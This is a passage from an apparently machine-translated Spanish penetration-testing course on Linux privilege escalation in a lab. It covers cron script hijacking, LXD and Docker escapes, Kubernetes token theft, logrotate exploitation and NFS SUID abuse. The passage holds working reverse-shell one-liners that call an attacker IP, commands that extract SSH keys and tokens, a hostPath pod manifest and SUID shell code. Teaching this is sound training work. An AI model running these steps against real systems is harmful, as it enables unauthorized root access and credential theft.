    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 

<SNIP>

2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f 
2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon 
2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind 
2020/09/04 20:45:03 CMD: UID=0    PID=10     | 
2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
```

### Observar y editar el script

Podemos mirar el script de shell y agregarle un comando para intentar obtener un shell inverso como root. Si edita un script, asegúrese de `ALWAYS` tome una copia del script y/o cree una copia de seguridad del mismo. También debemos intentar agregar nuestros comandos al final del script para que aún se ejecuten correctamente antes de ejecutar nuestro comando shell inverso.

```shell-session
vcrdcr@htb[/htb]$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

Podemos ver que el script solo está tomando un directorio de origen y destino como variables. A continuación, especifica un nombre de archivo con la fecha y hora actuales de la copia de seguridad y crea un tarball del directorio de origen, el directorio raíz web. Modifiquemos el script para agregar un [Bash shell inverso de una línea](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

```bash
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
```

Modificamos el script, levantamos un local `netcat` oyente, y espera. Efectivamente, en tres minutos, ¡tenemos un caparazón raíz!

```shell-session
vcrdcr@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38882
bash: cannot set terminal process group (9143): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id
id
uid=0(root) gid=0(root) groups=0(root)

root@NIX02:~# hostname
hostname
NIX02
```

## Contendedores de Linux (LXD)
Los contenedores funcionan a nivel de sistema operativo y las máquinas virtuales a nivel de hardware. Por lo tanto, los contenedores comparten un sistema operativo y aíslan los procesos de aplicación del resto del sistema, mientras que la virtualización clásica permite que múltiples sistemas operativos se ejecuten simultáneamente en un solo sistema.

#### Ver si tenemos Daemon Linux

Daemon Linux ([LXD](https://github.com/lxc/lxd)) es similar en algunos aspectos, pero está diseñado para contener un sistema operativo completo. Por lo tanto, no es un contenedor de aplicación, sino un contenedor de sistema. Antes de que podamos usar este servicio para escalar nuestros privilegios, debemos estar en cualquiera de los dos `lxc` o `lxd` grupo. Podemos averiguarlo con el siguiente comando:

```shell-session
container-user@nix02:~$ id

uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)
```

#### Localizar imagen

A partir de ahora, ahora hay varias formas en que podemos explotar `LXC`/`LXD`. Podemos crear nuestro propio contenedor y transferirlo al sistema de destino o usar un contenedor existente. Desafortunadamente, los administradores a menudo usan plantillas que tienen poca o ninguna seguridad. Esta actitud tiene la consecuencia de que ya tenemos herramientas que podemos usar contra el sistema nosotros mismos.

```shell-session
container-user@nix02:~$ cd ContainerImages
container-user@nix02:~$ ls

ubuntu-template.tar.xz
```

#### Importar imagen

Dichas plantillas a menudo no tienen contraseñas, especialmente si son entornos de prueba sin complicaciones. Estos deben ser rápidamente accesibles y sin complicaciones de usar. El enfoque en la seguridad complicaría toda la iniciación, la haría más difícil y, por lo tanto, la ralentizaría considerablemente. Si tenemos un poco de suerte y hay un contenedor de este tipo en el sistema, puede ser explotado. Para esto, necesitamos importar este contenedor como una imagen.

```shell-session
container-user@nix02:~$ lxc image import ubuntu-template.tar.xz --alias ubuntutemp
container-user@nix02:~$ lxc image list

+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
|                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
| ubuntu/18.04 (v1.1.2)               | 623c9f0bde47 | no    | Ubuntu bionic amd64 (20221024_11:49)     | x86_64       | CONTAINER       | 106.49MB  | Oct 24, 2022 at 12:00am (UTC) |
+-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
```

#### Iniciar la imagen y configurarla

Después de verificar que esta imagen se ha importado con éxito, podemos iniciar la imagen y configurarla especificando el `security.privileged` bandera y la ruta de la raíz para el contenedor. Esta bandera desactiva todas las características de aislamiento que nos permiten actuar en el host.

```shell-session
container-user@nix02:~$ lxc init ubuntutemp privesc -c security.privileged=true
container-user@nix02:~$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

#### Iniciar contenedor e iniciar sesión

Una vez que lo hayamos hecho, podemos iniciar el contenedor e iniciar sesión en él. En el contenedor, podemos ir a la ruta que especificamos para acceder al `resource` del sistema host como `root`.

```shell-session
container-user@nix02:~$ lxc start privesc
container-user@nix02:~$ lxc exec privesc /bin/bash
root@nix02:~# ls -l /mnt/root

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```


## Docker
Lo que puede pasar es que tengamos acceso a un entorno donde encontraremos usuarios que puedan gestionar contenedores docker. Con esto, podríamos buscar formas de usar esos contenedores docker para obtener mayores privilegios en el sistema de destino. Podemos usar varias formas y técnicas para escalar nuestros privilegios o escapar del contenedor docker.

#### Directorios Compartidos de Docker

Cuando se utiliza Docker, los directorios compartidos (montajes de volumen) pueden cerrar la brecha entre el sistema host y el sistema de archivos del contenedor. Con directorios compartidos, directorios o archivos específicos en el sistema host pueden ser accesibles dentro del contenedor. Esto es increíblemente útil para datos persistentes, compartir código y facilitar la colaboración entre entornos de desarrollo y contenedores Docker. Sin embargo, siempre depende de la configuración del entorno y de los objetivos que los administradores quieren lograr. Para crear un directorio compartido, se especifica una ruta en el sistema host y una ruta correspondiente dentro del contenedor, creando un enlace directo entre las dos ubicaciones.

Cuando tengamos acceso al contenedor docker y lo enumeremos localmente, podríamos encontrar directorios adicionales (no estándar) en el sistema de archivos dockerrays.

```shell-session
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A partir de aquí, podríamos copiar el contenido de la clave SSH privada para `cry0l1t3.priv` archiva y úsalo para iniciar sesión como usuario `cry0l1t3` en el sistema host.

```shell-session
vcrdcr@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

#### Bolsillos Docker

Un socket Docker o socket Docker daemon es un archivo especial que nos permite y procesa comunicarnos con el daemon Docker. Esta comunicación se produce a través de un socket Unix o un socket de red, dependiendo de la configuración de nuestra configuración Docker. Actúa como un puente, facilitando la comunicación entre el cliente Docker y el demonio Docker. Cuando emitimos un comando a través de Docker CLI, el cliente Docker envía el comando al socket Docker, y el demonio Docker, a su vez, procesa el comando y lleva a cabo las acciones solicitadas.

Sin embargo, los sockets Docker requieren permisos apropiados para garantizar una comunicación segura y evitar el acceso no autorizado. El acceso al socket Docker generalmente está restringido a usuarios o grupos de usuarios específicos, lo que garantiza que solo las personas de confianza puedan emitir comandos e interactuar con el demonio Docker. Al exponer el socket Docker a través de una interfaz de red, podemos administrar de forma remota los hosts Docker, emitir comandos y controlar contenedores y otros recursos. Este acceso remoto a la API amplía las posibilidades de configuraciones distribuidas de Docker y escenarios de administración remota. Sin embargo, dependiendo de la configuración, hay muchas formas en que se pueden almacenar procesos o tareas automatizados. Esos archivos pueden contener información muy útil para nosotros que podemos usar para escapar del contenedor Docker.

```shell-session
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

A partir de ahora, podemos usar el `docker` binario para interactuar con el socket y enumerar qué contenedores docker ya se están ejecutando. Si no está instalado, podemos descargarlo [aquí](https://master.dockerproject.org/linux/x86_64/docker) y cárgalo en el contenedor Docker.

```shell-session
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

Podemos crear nuestro propio contenedor Docker que mapea el directorio raíz de hosts (`/`) a la `/hostsystem` directorio en el contenedor. Con esto, obtendremos acceso completo al sistema host. Por lo tanto, debemos mapear estos directorios en consecuencia y usar el `main_app` Imagen docker.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

Ahora, podemos iniciar sesión en el nuevo contenedor Docker privilegiado con el ID `7ae3bcc818af` y navegar hasta el `/hostsystem`.

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A partir de ahí, podemos intentar nuevamente tomar la clave SSH privada e iniciar sesión como root o como cualquier otro usuario en el sistema con una clave SSH privada en su carpeta.


---


#### Grupo Docker

Para obtener privilegios de root a través de Docker, el usuario con el que hemos iniciado sesión debe estar en el `docker` grupo. Esto le permite usar y controlar el demonio Docker.

```shell-session
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Alternativamente, Docker puede tener un conjunto SUID, o estamos en el archivo Sudoers, lo que nos permite ejecutar `docker` como raíz. Las tres opciones nos permiten trabajar con Docker para escalar nuestros privilegios.

La mayoría de los hosts tienen una conexión directa a Internet porque las imágenes base y los contenedores deben descargarse. Sin embargo, muchos hosts pueden desconectarse de Internet por la noche y fuera del horario laboral por razones de seguridad. Sin embargo, si estos hosts se encuentran en una red donde, por ejemplo, un servidor web tiene que pasar, todavía se puede llegar.

Para ver qué imágenes existen y a qué podemos acceder, podemos usar el siguiente comando:

```shell-session
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

#### Socket Docker

Un caso que también puede ocurrir es cuando el socket Docker es escribible. Por lo general, este enchufe se encuentra en `/var/run/docker.sock`. Sin embargo, la ubicación puede ser comprensiblemente diferente. Porque básicamente, esto solo puede ser escrito por el grupo root o docker. Si actuamos como usuario, no en uno de estos dos grupos, y el socket Docker todavía tiene los privilegios para ser escribible, entonces todavía podemos usar este caso para escalar nuestros privilegios.

```shell-session
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```



## Kubernetes

Para obtener mayores privilegios y acceder al sistema host, podemos utilizar una herramienta llamada [kubeletctl](https://github.com/cyberark/kubeletctl) para obtener la cuenta de servicio de Kubernetes `token` y `certificate` (`ca.crt`) desde el servidor. Para hacer esto, debemos proporcionar la dirección IP, el espacio de nombres y el pod de destino del servidor. En caso de que obtengamos este token y certificado, podemos elevar aún más nuestros privilegios, movernos horizontalmente a través del clúster u obtener acceso a módulos y recursos adicionales.

#### API de Kubelet - Extracción de tokens

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

#### Kubelet API - Extracción de certificados

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```

Ahora que tenemos ambos `token` y `certificate`, podemos comprobar los derechos de acceso en el clúster de Kubernetes. Esto se usa comúnmente para la auditoría y verificación para garantizar que los usuarios tengan el nivel correcto de acceso y no se les otorguen más privilegios de los que necesitan. Sin embargo, podemos usarlo para nuestros propósitos y podemos preguntar a K8 si tenemos permiso para realizar diferentes acciones en varios recursos.

#### Lista Privilegios

```shell-session
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

Aquí podemos ver algunas informaciones muy importantes. Además de los recursos de auto-sujeto que podemos `get`, `create`, y `list` pods que son los recursos que representan el contenedor en ejecución en el clúster. A partir de ahora, podemos crear un `YAML` archivo que podemos usar para crear un nuevo contenedor y montar todo el sistema de archivos raíz desde el sistema host en este contenedor `/root` directorio. A partir de ahí, podríamos acceder a los archivos y directorios de los sistemas host. El `YAML` el archivo podría parecer lo siguiente:

#### YAML Pod

Código: ñame

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Una vez creado, ahora podemos crear el nuevo pod y verificar si se está ejecutando como se esperaba.

#### Creando un nuevo Pod

```shell-session
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

Si el pod se está ejecutando, podemos ejecutar el comando y podríamos generar un shell inverso o recuperar datos confidenciales como la clave SSH privada del usuario raíz.

#### Extracción de la llave SSH de Root

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```

## Logrotate

Cada sistema Linux produce grandes cantidades de archivos de registro. Para evitar que el disco duro se desborde, una herramienta llamada `logrotate` se encarga de archivar o eliminar registros antiguos. Si no se presta atención a los archivos de registro, se vuelven cada vez más grandes y eventualmente ocupan todo el espacio en disco disponible. Además, buscar a través de muchos archivos de registro grandes lleva mucho tiempo. Para evitar esto y ahorrar espacio en disco, `logrotate` ha sido desarrollado. Los registros en `/var/log` brinde a los administradores la información que necesitan para determinar la causa detrás del mal funcionamiento. Casi más importantes son los detalles inadvertidos del sistema, como si todos los servicios se ejecutan correctamente.


`Logrotate`tiene muchas características para administrar estos archivos de registro. Estos incluyen la especificación de:

- el `size` del archivo de registro,
- su `age`,
- y el `action` debe tomarse cuando se alcanza uno de estos factores

```shell-session
vcrdcr@htb[/htb]$ man logrotate
vcrdcr@htb[/htb]$ # or
vcrdcr@htb[/htb]$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```


La función de la rotación en sí consiste en cambiar el nombre de los archivos de registro. Por ejemplo, se pueden crear nuevos archivos de registro para cada nuevo día, y los más antiguos se renombrarán automáticamente. Otro ejemplo de esto sería vaciar el archivo de registro más antiguo y así reducir el consumo de memoria.

Esta herramienta generalmente se inicia periódicamente a través de `cron` y controlado a través del archivo de configuración `/etc/logrotate.conf`. Dentro de este archivo, contiene configuraciones globales que determinan la función de `logrotate`.

```shell-session
vcrdcr@htb[/htb]$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```


Para forzar una nueva rotación el mismo día, podemos establecer la fecha después de los archivos de registro individuales en el archivo de estado `/var/lib/logrotate.status` o usar el `-f`/`--force` opción:

```shell-session
vcrdcr@htb[/htb]$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

Podemos encontrar los archivos de configuración correspondientes en `/etc/logrotate.d/` directorio.

```shell-session
vcrdcr@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```shell-session
vcrdcr@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```


### Explotación

Para explotar `logrotate`, necesitamos algunos requisitos que tenemos que cumplir.

1. necesitamos `write` permisos en los archivos de registro
2. logrotate debe ejecutarse como un usuario privilegiado o `root`
3. versiones vulnerables:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

Hay un exploit prefabricado que podemos usar para esto si se cumplen los requisitos. Este exploit se llama [logrotten](https://github.com/whotwagner/logrotten). Podemos descargarlo y compilarlo en un núcleo similar del sistema de destino y luego transferirlo al sistema de destino. Alternativamente, si podemos compilar el código en el sistema de destino, entonces podemos hacerlo directamente en el sistema de destino.

```shell-session
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten
```

A continuación, necesitamos que se ejecute una carga útil. Aquí hay muchas opciones diferentes disponibles para nosotros que podemos usar. En este ejemplo, ejecutaremos un shell inverso simple basado en bash con el `IP` y `port` de nuestra VM que utilizamos para atacar el sistema de destino.

```shell-session
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

Sin embargo, antes de ejecutar el exploit, debemos determinar qué opción `logrotate` usos en `logrotate.conf`.

```shell-session
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

En nuestro caso, es la opción: `create`. Por lo tanto, tenemos que utilizar el exploit adaptado a esta función.

Después de eso, tenemos que iniciar un oyente en nuestra VM /Pwnbox, que espera la conexión del sistema de destino.

```shell-session
vcrdcr@htb[/htb]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```

Como paso final, ejecutamos el exploit con la carga útil preparada y esperamos un shell inverso como usuario privilegiado o root.

```shell-session
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

```shell-session
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```


##### Nota, ejecútalo a la vez

```
echo test > backups/access.log && ./logrotten -p ./payload ~/backups/access.log
```


## Otras técnicas

### Captura de Tráfico Pasivo

Si `tcpdump` está instalado, los usuarios no privilegiados pueden capturar el tráfico de red, incluidas, en algunos casos, las credenciales pasadas en texto claro. Existen varias herramientas, como [créditos netos](https://github.com/DanMcInerney/net-creds) y [PCredz](https://github.com/lgandx/PCredz) eso se puede usar para examinar los datos que se transmiten en el cable. Esto puede resultar en la captura de información confidencial, como números de tarjetas de crédito y cadenas de comunidad SNMP. También puede ser posible capturar hashes Net-NTLMv2, SMBv2 o Kerberos, que podrían estar sujetos a un ataque de fuerza bruta fuera de línea para revelar la contraseña de texto sin formato. Los protocolos de texto claro como HTTP, FTP, POP, IMAP, telnet o SMTP pueden contener credenciales que podrían reutilizarse para escalar privilegios en el host.

### Privilegios Débiles de NFS

Network File System (NFS) permite a los usuarios acceder a archivos o directorios compartidos a través de la red alojada en sistemas Unix/Linux. NFS utiliza el puerto TCP/UDP 2049. Cualquier montaje accesible se puede enumerar de forma remota emitiendo el comando `showmount -e`, que enumera la lista de exportación del servidor NFS (o la lista de control de acceso para sistemas de archivos) que los clientes NFS.

```shell-session
vcrdcr@htb[/htb]$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
```

Cuando se crea un volumen NFS, se pueden establecer varias opciones:

|Opción|Descripción|
|---|---|
|`root_squash`|Si el usuario raíz se utiliza para acceder a las acciones de NFS, se cambiará a `nfsnobody` usuario, que es una cuenta no privilegiada. Cualquier archivo creado y cargado por el usuario root será propiedad de la `nfsnobody` usuario, que evita que un atacante cargue binarios con el conjunto de bits SUID.|
|`no_root_squash`|Los usuarios remotos que se conecten al recurso compartido como usuario root local podrán crear archivos en el servidor NFS como usuario root. Esto permitiría la creación de scripts/programas maliciosos con el conjunto de bits SUID.|


```shell-session
htb@NIX02:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
```

Por ejemplo, podemos crear un binario SETUID que se ejecute `/bin/sh` usando nuestro usuario root local. Entonces podemos montar el `/tmp` directorio localmente, copie el binario propiedad de la raíz en el servidor NFS y establezca el bit SUID.

Primero, cree un binario simple, monte el directorio localmente, cópielo y establezca los permisos necesarios.

```shell-session
htb@NIX02:~$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
```

```shell-session
htb@NIX02:/tmp$ gcc shell.c -o shell
```

```shell-session
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
```

Cuando volvemos a la sesión de bajo privilegio del host, podemos ejecutar el binario y obtener un shell raíz.

```shell-session
htb@NIX02:/tmp$  ls -la

total 68
